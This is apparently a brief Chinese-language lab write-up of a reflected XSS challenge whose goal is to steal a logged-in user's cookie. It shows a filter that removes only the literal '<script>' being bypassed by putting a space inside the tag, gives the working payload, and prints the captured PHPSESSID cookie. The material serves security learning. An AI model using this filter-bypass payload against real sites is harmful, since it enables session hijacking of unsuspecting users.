# Reflected XSS

>Objective 
> One way or another, steal the cookie of a logged in user.

### 觀察

看 source 的話會發現他只有 replace `<script>` ，也就是說只要避開完整的字串就行了🤔

### 試著將字串拆開

經過幾次嘗試後，試著將 tag 結尾前的字串拆開空出一格，會發現這樣做下面的參考連結也都消失了
```
<script >alert(1)
```

### Done
看起瀏覽器一樣會認為這是合法的 script tag
```jsx
<script >alert(document.cookie)</script>
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/f33cae9f-7615-48ee-a8d5-0c53dd922f0a/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220216%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220216T143428Z&X-Amz-Expires=86400&X-Amz-Signature=bfc5a9db0108ec1cda7b4c5fe0d3f3a1e09d15be6597f8ec8c1b8e3ce634907b&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```
PHPSESSID=ov64qqshkod7693old2kdk59e3; security=medium
```
